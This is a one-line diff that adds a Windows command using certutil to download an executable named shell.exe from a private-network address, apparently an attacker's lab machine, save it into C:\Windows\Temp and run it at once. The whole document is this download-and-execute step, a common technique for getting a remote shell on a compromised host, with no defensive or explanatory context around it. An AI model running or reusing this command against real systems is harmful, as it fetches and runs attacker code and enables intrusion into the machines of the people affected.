@@ -1,0 +1,1 @@
+certutil -urlcache -split -f http://10.10.14.14:8000/shell.exe c:\windows\Temp\shell.exe && c:\windows\Temp\shell.exe
